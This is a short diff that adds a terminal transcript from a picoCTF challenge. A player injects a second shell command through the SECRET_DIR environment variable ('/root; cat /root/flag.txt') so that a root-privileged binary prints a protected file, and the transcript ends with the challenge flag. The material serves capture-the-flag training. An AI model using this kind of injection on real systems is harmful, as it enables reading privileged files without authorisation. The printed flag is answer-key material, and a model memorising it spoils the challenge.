@@ -1,0 +1,4 @@
+ctf-player@pico-chall$ SECRET_DIR="/root; cat /root/flag.txt" ./bin
+Listing the content of /root; cat /root/flag.txt as root: 
+flag.txt
+picoCTF{Power_t0_man!pul4t3_3nv_d0cc7fe2}
